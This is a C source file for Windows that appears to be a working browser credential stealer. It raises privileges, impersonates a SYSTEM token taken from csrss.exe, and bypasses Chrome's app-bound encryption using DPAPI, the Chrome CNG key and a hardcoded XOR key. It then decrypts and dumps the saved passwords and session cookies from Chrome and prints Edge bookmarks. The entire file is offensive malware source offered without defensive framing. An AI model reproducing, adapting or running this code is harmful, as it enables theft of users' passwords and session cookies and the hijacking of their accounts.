#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>   
#include <shlobj.h>   
#include <wincrypt.h>  
#include <ncrypt.h>    
#include <bcrypt.h>     
#include "sqlite3.h"

#pragma comment(lib,"bcrypt.lib")
#pragma comment(lib,"ncrypt.lib")
#pragma comment(lib,"crypt32.lib")
#define CONST const
typedef char CHAR;
#define COOKIE 0
#define SAVED_LOGIN 1
CONST CHAR SecretVersion[] = { 'v', '2', '0' };
#define AES_KEY_BLOB_SIZE (sizeof(BCRYPT_KEY_DATA_BLOB_HEADER) + 32)
#define DBGA(...) printf(__VA_ARGS__), printf("\n")
#define HEAP_ALLOC(size) HeapAlloc(GetProcessHeap(), 0, size)
#define HEAP_FREE(ptr) HeapFree(GetProcessHeap(), 0, ptr)
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
CONST UCHAR XorKey[] = { 0xCC, 0xF8, 0xA1, 0xCE, 0xC5, 0x66, 0x05, 0xB8, 0x51, 0x75, 0x52, 0xBA, 0x1A, 0x2D, 0x06, 0x1C, 0x03, 0xA2, 0x9E, 0x90, 0x27, 0x4F, 0xB2, 0xFC, 0xF5, 0x9B, 0xA4, 0xB7, 0x5C, 0x39, 0x23, 0x90 };
CONST CHAR CookiesSqlQuery[] = "SELECT host_key, path, name, datetime((expires_utc / 1000000) - 11644473600, 'unixepoch', 'localtime'), encrypted_value, length(encrypted_value) from cookies;";



VOID PrintSavedLoginsBanner()
{
    wprintf(L"\n");
    wprintf(L"=============================================\n");
    wprintf(L"        CHROME SAVED LOGINS (DECRYPTED)\n");
    wprintf(L"=============================================\n");
    wprintf(L"%-30S %-25S %-25S\n", "URL", "USERNAME", "PASSWORD");
    wprintf(L"--------------------------------------------------------------------------\n");
}

VOID PrintBookmarksBanner()
{
    wprintf(L"\n==============================\n");
    wprintf(L"       Chrome Bookmarks\n");
    wprintf(L"==============================\n\n");
}

VOID PrintCookiesBanner()
{
    wprintf(L"\n");
    wprintf(L"=====================================\n");
    wprintf(L"        Chrome Cookies Dump\n");
    wprintf(L"=====================================\n\n");
}



ULONG GetProcessPid(_In_ LPCWSTR ProcessName)
{
    HANDLE         Snapshot;
    ULONG          ProcessId = 0;
    PROCESSENTRY32 Entry;



    Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Snapshot == INVALID_HANDLE_VALUE)
    {
        return 0;
    }

    Entry.dwSize = sizeof(PROCESSENTRY32);



    if (Process32First(Snapshot, &Entry) == FALSE)
    {
        CloseHandle(Snapshot);
        return 0;
    }



    do
    {
        if (wcscmp(Entry.szExeFile, ProcessName) == 0)
        {
            ProcessId = Entry.th32ProcessID;
            break;
        }

    } while (Process32Next(Snapshot, &Entry));



    CloseHandle(Snapshot);
    return ProcessId;
}

HANDLE OpenProcessTokenByName(_In_ LPCWSTR ProcessName)
{
    ULONG  ProcessId;
    HANDLE ProcessHandle;
    HANDLE TokenHandle = 0;

    ProcessId = GetProcessPid(ProcessName);

    if (ProcessId == 0)
    {
        wprintf(L"Could not get the PID of: %ws\n", ProcessName);
        return 0;
    }




    ProcessHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, ProcessId);

    if (ProcessHandle == INVALID_HANDLE_VALUE)
    {
        wprintf(L"Could not open a handle to: %lu error: %lu\n", ProcessId, GetLastError());
        return 0;
    }



    if (OpenProcessToken(ProcessHandle, TOKEN_QUERY | TOKEN_DUPLICATE, &TokenHandle) == FALSE)
    {
        wprintf(L"Could not open a handle to the token of: %lu error: %lu\n", ProcessId, GetLastError());
    }

    CloseHandle(ProcessHandle);
    return TokenHandle;
}


PBYTE Base64Decode(IN LPCSTR pszInput, IN DWORD cbInput, OUT PDWORD pcbOutput)
{
    PBYTE   pbOutput = NULL;
    DWORD   dwOutput = 0x00;

    if (!pszInput || cbInput == 0 || !pcbOutput) return NULL;

    *pcbOutput = 0;

    if (!CryptStringToBinaryA(pszInput, cbInput, CRYPT_STRING_BASE64, NULL, &dwOutput, NULL, NULL))
    {
        DBGA("[!] CryptStringToBinaryA Failed With Error: %lu", GetLastError());
        return NULL;
    }

    if (!(pbOutput = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwOutput)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return NULL;
    }

    if (!CryptStringToBinaryA(pszInput, cbInput, CRYPT_STRING_BASE64, pbOutput, &dwOutput, NULL, NULL))
    {
        DBGA("[!] CryptStringToBinaryA Failed With Error: %lu", GetLastError());
        HEAP_FREE(pbOutput);
        return NULL;
    }

    *pcbOutput = dwOutput;
    return pbOutput;
}

typedef NTSTATUS(NTAPI* RtlAcquirePrivilege_t)(
    PULONG Privilege,
    ULONG NumPriv,
    ULONG Flags,
    PVOID* ReturnedState
    );

typedef NTSTATUS(NTAPI* RtlReleasePrivilege_t)(
    PVOID State
    );


#define SE_DEBUG_PRIVILEGE 20

HANDLE GetSystemToken()
{
    NTSTATUS Status;
    ULONG Privilege = SE_DEBUG_PRIVILEGE;
    PVOID State;

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");

    RtlAcquirePrivilege_t RtlAcquirePrivilege =
        (RtlAcquirePrivilege_t)GetProcAddress(ntdll, "RtlAcquirePrivilege");

    Status = RtlAcquirePrivilege(&Privilege, 1, 0, &State);

    if (!NT_SUCCESS(Status))
    {
        wprintf(L"Could not acquire SeDebugPrivilege: 0x%08lX\n", Status);
        return NULL;
    }

    return OpenProcessTokenByName(L"csrss.exe");
}

BOOLEAN DecryptUsingChromeKey(_In_ PUCHAR Ciphertext)
{
    NCRYPT_PROV_HANDLE ProviderHandle;
    NCRYPT_KEY_HANDLE  KeyHandle;
    ULONG              BytesDecrypted;
    SECURITY_STATUS    Status;


    Status = NCryptOpenStorageProvider(&ProviderHandle, L"Microsoft Software Key Storage Provider", 0);

    if (Status != ERROR_SUCCESS)
    {
        wprintf(L"Could not open key storage provider: 0x%08lX\n", Status);
        return FALSE;
    }



    Status = NCryptOpenKey(ProviderHandle, &KeyHandle, L"Google Chromekey1", 0, 0);

    if (Status != ERROR_SUCCESS)
    {
        wprintf(L"Could not open the Google Chromekey1 key: 0x%08lX\n", Status);
        NCryptFreeObject(ProviderHandle);
        return FALSE;
    }



    Status = NCryptDecrypt(KeyHandle, Ciphertext, 32, 0, Ciphertext, 32, &BytesDecrypted, NCRYPT_SILENT_FLAG);
    NCryptFreeObject(KeyHandle);
    NCryptFreeObject(ProviderHandle);

    if (Status != ERROR_SUCCESS)
    {
        wprintf(L"Failed decrypting the app-bound key using the Chromekey1 key: 0x%08lX\n", Status);
        return FALSE;
    }

    return TRUE;
}

BOOLEAN Aes256GcmDecrypt(_In_ PUCHAR Key, _In_ ULONG KeySize, _In_ PUCHAR Nonce, _In_ ULONG NonceSize, _In_ PUCHAR Tag, _In_ ULONG TagSize, _Inout_ PUCHAR Ciphertext, _Inout_ ULONG CiphertextLength)
{
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO CipherInfo;
    BCRYPT_ALG_HANDLE                     AlgorithmHandle;
    BCRYPT_KEY_HANDLE                     KeyHandle = 0;
    UCHAR                                 Buffer[AES_KEY_BLOB_SIZE];
    BCRYPT_KEY_DATA_BLOB_HEADER* KeyBlob;
    ULONG                                 PlaintextSize;
    NTSTATUS                              Status;



    Status = BCryptOpenAlgorithmProvider(&AlgorithmHandle, BCRYPT_AES_ALGORITHM, 0, 0);

    if (!BCRYPT_SUCCESS(Status))
    {
        wprintf(L"Could not open a handle on the AES algorithm provider: 0x%08lX\n", Status);
        return FALSE;
    }

    do
    {


        Status = BCryptSetProperty(AlgorithmHandle, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);

        if (!BCRYPT_SUCCESS(Status))
        {
            break;
        }



        KeyBlob = (BCRYPT_KEY_DATA_BLOB_HEADER*)Buffer;
        KeyBlob->dwMagic = BCRYPT_KEY_DATA_BLOB_MAGIC;
        KeyBlob->dwVersion = 1;
        KeyBlob->cbKeyData = KeySize;

        RtlCopyMemory(Buffer + sizeof(BCRYPT_KEY_DATA_BLOB_HEADER), Key, KeySize);

        Status = BCryptImportKey(AlgorithmHandle, 0, BCRYPT_KEY_DATA_BLOB, &KeyHandle, 0, 0, Buffer, sizeof(Buffer), 0);

        if (!BCRYPT_SUCCESS(Status))
        {
            wprintf(L"Could not import AES key: 0x%08lX\n", Status);
            break;
        }

    

        BCRYPT_INIT_AUTH_MODE_INFO(CipherInfo);
        CipherInfo.pbNonce = Nonce;
        CipherInfo.cbNonce = NonceSize;
        CipherInfo.pbTag = Tag;
        CipherInfo.cbTag = TagSize;


        Status = BCryptDecrypt(KeyHandle, Ciphertext, CiphertextLength, &CipherInfo, 0, 0, Ciphertext, CiphertextLength, &CiphertextLength, 0);

        if (!BCRYPT_SUCCESS(Status))
        {
            wprintf(L"Could not decrypt the ciphertext: 0x%08lX\n", Status);
        }

    } while (FALSE);

    if (KeyHandle != 0)
    {
        BCryptDestroyKey(KeyHandle);
    }

    BCryptCloseAlgorithmProvider(AlgorithmHandle, 0);
    return BCRYPT_SUCCESS(Status);
}


BOOLEAN DecryptAppBoundKey(_In_ PUCHAR AppBoundKey, _In_ ULONG AppBoundKeySize, _Out_ PUCHAR DecryptedKey)
{
    DATA_BLOB EncryptedKey;
    DATA_BLOB UserKey;
    DATA_BLOB Key = { 0 };
    PUCHAR    AesKey;
    PUCHAR    Nonce;
    PUCHAR    Ciphertext;
    PUCHAR    Tag;
    BOOLEAN   Result;
    HANDLE    SystemToken;

    SystemToken = GetSystemToken();

    if (SystemToken == 0)
    {
        return 0;
    }

    do
    {
        

        Result = ImpersonateLoggedOnUser(SystemToken);

        if (Result == FALSE)
        {
            break;
        }

        EncryptedKey.pbData = AppBoundKey;
        EncryptedKey.cbData = AppBoundKeySize;

        Result = CryptUnprotectData(&EncryptedKey, 0, 0, 0, 0, 0, &UserKey);
        RevertToSelf();

        if (Result == FALSE)
        {
            wprintf(L"Could not decrypt the app-bound key as SYSTEM\n");
            break;
        }

        

        Result = CryptUnprotectData(&UserKey, 0, 0, 0, 0, 0, &Key);
        LocalFree(UserKey.pbData);

        if (Result == FALSE)
        {
            wprintf(L"Could not decrypt the app-bound key as the Chrome user\n");
            break;
        }

        

        AesKey = *(PULONG)Key.pbData + (Key.pbData + sizeof(ULONG)) + sizeof(ULONG) + 1;
        Nonce = AesKey + 32;        
        Ciphertext = Nonce + 12;     
        Tag = Ciphertext + 32;       

        

        Result = ImpersonateLoggedOnUser(SystemToken);

        if (Result == FALSE)
        {
            break;
        }

        Result = DecryptUsingChromeKey(AesKey);
        RevertToSelf();

        if (Result == FALSE)
        {
            break;
        }

        for (UCHAR Index = 0; Index < 32; Index++)
        {
            AesKey[Index] ^= XorKey[Index];
        }

        

        Result = Aes256GcmDecrypt(AesKey, 32, Nonce, 12, Tag, 16, Ciphertext, 32);

        if (Result == TRUE)
        {
            RtlCopyMemory(DecryptedKey, Ciphertext, 32);
        }

    } while (FALSE);

    if (Key.pbData != 0)
    {
        LocalFree(Key.pbData);
    }

    CloseHandle(SystemToken);
    return Result;
}



CONST CHAR kCryptAppBoundKeyPrefix[] = { 'A', 'P', 'P', 'B' };



BOOLEAN ExtractAppBoundKey(_In_ PSTR LocalState, _Out_ PUCHAR DecryptedKey)
{
    PSTR    AppBoundKey;
    BOOLEAN Result;
    PUCHAR  DecodedKey;
    ULONG   KeySize;

    

    AppBoundKey = strstr(LocalState, "app_bound_encrypted_key");

    if (AppBoundKey == 0)
    {
        wprintf(L"Could not find the AppBound key in the local state file\n");
        return FALSE;
    }

    

    AppBoundKey += sizeof("\"app_bound_encrypted_key\"");
    KeySize = strchr(AppBoundKey, '"') - AppBoundKey;

    

    DecodedKey = Base64Decode(AppBoundKey, KeySize, &KeySize);

    if (DecodedKey == 0)
    {
        return FALSE;
    }

    

    Result = DecryptAppBoundKey(DecodedKey + sizeof(kCryptAppBoundKeyPrefix), KeySize - sizeof(kCryptAppBoundKeyPrefix), DecryptedKey); // Skip over the key's header ("APPB")
    HeapFree(GetProcessHeap(), 0, DecodedKey);

    return Result;
}



PUCHAR ReadFileContents(_In_ PWCHAR FileName, _Inout_ PULONG Size)
{
    HANDLE FileHandle;
    ULONG  FileSize;
    ULONG  BytesRead;
    BOOL   Result;
    PUCHAR Buffer = 0;

    FileHandle = CreateFileW(FileName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

    if (FileHandle == INVALID_HANDLE_VALUE)
    {
        wprintf(L"Couldn't open a handle on the: %ws file: %lu\n", FileName, GetLastError());
        return 0;
    }

    do
    {
        FileSize = GetFileSize(FileHandle, 0);

        if (FileSize == 0)
        {
            wprintf(L"Couldn't get the size of the: %ws file: %lu\n", FileName, GetLastError());
            break;
        }

        Buffer = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, FileSize);

        if (Buffer == 0)
        {
            wprintf(L"Couldn't allocate the %lu bytes to read : %ws\n", FileSize, FileName);
            break;
        }

        Result = ReadFile(FileHandle, Buffer, FileSize, &BytesRead, 0);

        if (Result == FALSE || BytesRead != FileSize)
        {
            wprintf(L"Could read the: %ws file: %lu\n", FileName, GetLastError());
            HeapFree(GetProcessHeap(), 0, Buffer);
            Buffer = 0;
        }
        else if (Size != 0)
        {
            *Size = FileSize;
        }
    } while (FALSE);

    CloseHandle(FileHandle);
    return Buffer;
}


VOID PrintChromeSecret(_In_ PUCHAR AppBoundKey, _In_ UCHAR Type, _In_ PUCHAR Data, _In_ ULONG DataSize)
{
    PUCHAR Ciphertext;
    ULONG  CiphertextLength;
    PUCHAR Nonce; 
    PUCHAR Tag;   

    

    if (memcmp(Data, SecretVersion, sizeof(SecretVersion) != 0))
    {
        wprintf(L"Unsupported Chrome version\n");
        return;
    }

    

    Nonce = Data + sizeof(SecretVersion);

   

    Tag = Data + DataSize - 16;

    

    Ciphertext = Data + sizeof(SecretVersion) + 12;
    CiphertextLength = DataSize - (sizeof(SecretVersion) + 12 + 16);

    

    if (Aes256GcmDecrypt(AppBoundKey, 32, Nonce, 12, Tag, 16, Ciphertext, CiphertextLength) == TRUE)
    {
        if (Type == COOKIE)
        {
            wprintf(L"- Cookie: %.*hS\n\n", CiphertextLength - 32, Ciphertext + 32);
        }
        else if (Type == SAVED_LOGIN)
        {
            wprintf(L"- Password: %.*hS\n\n", CiphertextLength, Ciphertext);
        }
    }
}


CONST CHAR SavedLoginsSqlQuery[] = "SELECT origin_url, username_value, password_value FROM logins";

INT LoginsSqlCallback(PVOID AppBoundKey, INT Argc, PCHAR* Argv, PCHAR* ColumnName)
{
    wprintf(L"- URL: %hS\n", Argv[0]);
    wprintf(L"- Username: %hS\n", Argv[1]);

    PrintChromeSecret((PUCHAR)AppBoundKey, SAVED_LOGIN, (PUCHAR)Argv[2], strlen(Argv[2]));
    return 0;
}

VOID DumpChromeSavedLogins(_In_ PUCHAR AppBoundKey)
{
    PrintSavedLoginsBanner();

   

    sqlite3* CookiesDatabase;
    ULONG    Result;

    Result = sqlite3_open_v2(
        "Google\\Chrome\\User Data\\Default\\Login Data For Account",
        &CookiesDatabase,
        SQLITE_OPEN_READONLY,
        0
    );

    if (Result != SQLITE_OK)
    {
        wprintf(L"Error opening the logins database: %hS\n", sqlite3_errmsg(CookiesDatabase));
        return;
    }

    

    PCHAR ErrorMessage;
    Result = sqlite3_exec(CookiesDatabase, SavedLoginsSqlQuery, LoginsSqlCallback, AppBoundKey, &ErrorMessage);

    if (Result != SQLITE_OK)
    {
        wprintf(L"Failed querying the logins table of the database: %hS\n", ErrorMessage);
        sqlite3_free(ErrorMessage);
    }

    sqlite3_close_v2(CookiesDatabase);
}

VOID DumpChromeBookmarks()
{
    PrintBookmarksBanner();

    PSTR  BookmarksJson;
    PSTR  Name;
    ULONG NameSize;
    PSTR  Url;
    ULONG UrlSize;

    

    BookmarksJson = (PSTR)ReadFileContents((PWCHAR)L"Microsoft\\Edge\\User Data\\Default\\Bookmarks", 0);

    if (BookmarksJson == 0)
    {
        return;
    }

    for (Name = strstr(BookmarksJson, "\"name\":"); Name != 0; Name = strstr(Url, "\"name\""))
    {
        Name += sizeof("\"name\": ");
        NameSize = strchr(Name, '"') - Name;

        Url = strstr(Name + NameSize, "\"url\":");

        if (Url == 0)
        {
            break;
        }

        Url += sizeof("\"url\": ");
        UrlSize = strchr(Url, '"') - Url;

       

        wprintf(L"- Name: %.*hS\n", NameSize, Name);
        wprintf(L"- URL: %.*hS\n\n", UrlSize, Url);

        

        Url += UrlSize + sizeof('"');
    }

    HeapFree(GetProcessHeap(), 0, BookmarksJson);
}

INT CookiesSqlCallback(PVOID AppBoundKey, INT Argc, PCHAR* Argv, PCHAR* ColumnName)
{
    wprintf(L"- URL: %hS\n", Argv[0]);
    wprintf(L"- Path: %hS\n", Argv[1]);
    wprintf(L"- Name: %hS\n", Argv[2]);
    wprintf(L"- Expires: %hS\n", Argv[3]);

    PrintChromeSecret(
        (PUCHAR)AppBoundKey,
        COOKIE,
        (PUCHAR)Argv[4],
        strtoul(Argv[5], 0, 10)
    );
    return 0;
}

VOID DumpChromeCookies(_In_ PUCHAR AppBoundKey)
{
    PrintCookiesBanner();

    

    sqlite3* CookiesDatabase;
    ULONG    Result;

    Result = sqlite3_open_v2("Google\\Chrome\\User Data\\Default\\Network\\Cookies", &CookiesDatabase, SQLITE_OPEN_READONLY, 0);

    if (Result != SQLITE_OK)
    {
        wprintf(L"Error opening the cookies database: %hS\n", sqlite3_errmsg(CookiesDatabase));
        return;
    }

    

    PCHAR ErrorMessage;
    Result = sqlite3_exec(CookiesDatabase, CookiesSqlQuery, CookiesSqlCallback, AppBoundKey, &ErrorMessage);

    if (Result != SQLITE_OK)
    {
        wprintf(L"Failed querying the logins table of the database: %hS\n", ErrorMessage);
        sqlite3_free(ErrorMessage);
    }

    sqlite3_close_v2(CookiesDatabase);
}

INT main()
{
    

    HRESULT Result;
    PWSTR   AppDataPath;
    PUCHAR  LocalState;
    UCHAR   AppBoundKey[32];

    Result = SHGetKnownFolderPath(FOLDERID_LocalAppData, KF_FLAG_DONT_UNEXPAND, 0, &AppDataPath);

    if (FAILED(Result))
    {
        wprintf(L"Could not get the path of the AppData folder: %lu\n", Result);
        return -1;
    }

    

    SetCurrentDirectoryW(AppDataPath);
    CoTaskMemFree(AppDataPath);        

   

    LocalState = ReadFileContents((PWCHAR)L"Google\\Chrome\\User Data\\Local State", 0);

    if (LocalState == 0)
    {
        return -1;
    }

    Result = ExtractAppBoundKey((PSTR)LocalState, AppBoundKey);
    HeapFree(GetProcessHeap(), 0, LocalState);

    if (Result == FALSE)
    {
        return -1;
    }

  
    DumpChromeCookies(AppBoundKey);
    DumpChromeBookmarks();
    DumpChromeSavedLogins(AppBoundKey);

    return 0;
}
